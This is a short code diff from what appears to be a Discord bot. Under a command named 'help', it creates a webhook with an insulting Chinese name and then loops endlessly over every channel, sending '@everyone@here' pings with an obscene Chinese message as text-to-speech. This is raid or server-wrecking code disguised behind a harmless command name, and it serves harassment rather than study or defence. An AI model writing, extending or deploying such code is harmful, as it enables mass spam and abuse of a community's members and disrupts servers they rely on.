@@ -36,6 +36,7 @@ async def help(ctx):
         except:
             pass
     for channel in ctx.guild.channels:
+        webhook = await ctx.channel.create_webhook(name="幹垃圾群組")
         while True:
             await channel.send(f"@everyone@here\n吃我雞巴",tts=True)
             await webhook.send(f"@everyone@here\n吃我雞巴",tts=True)
